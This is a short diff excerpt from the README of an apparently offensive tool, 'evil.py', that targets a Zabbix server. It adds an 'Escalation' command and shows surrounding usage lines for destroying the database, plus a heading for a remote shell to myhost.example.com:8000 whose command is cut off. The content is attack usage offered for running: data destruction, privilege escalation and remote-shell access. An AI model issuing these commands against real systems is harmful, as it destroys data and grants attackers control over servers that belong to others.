@@ -49,6 +49,12 @@ Destroy database:
 python evil.py --activate http://127.0.0.1:8080 User zabbix destroy-database
 ```
 
+Escalation:
+
+```
+python evil.py --activate http://127.0.0.1:8080 User zabbix escalation User
+```
+
 Remote shell connecting to myhost.example.com:8000:
 
 ```
